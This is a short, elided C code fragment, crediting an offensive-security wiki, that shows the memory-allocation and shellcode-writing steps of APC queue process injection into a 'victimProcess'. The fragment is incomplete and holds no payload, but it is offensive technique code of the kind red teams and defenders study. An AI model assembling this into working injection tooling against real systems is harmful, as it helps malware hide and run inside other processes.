...
// original code - https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection
...
int main()
{
    ...
    LPVOID shellcodeAddress = VirtualAllocEx(victimProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellcodeAddress;
    WriteProcessMemory(victimProcess, shellcodeAddress, shellcode, shellcodeSize, NULL);
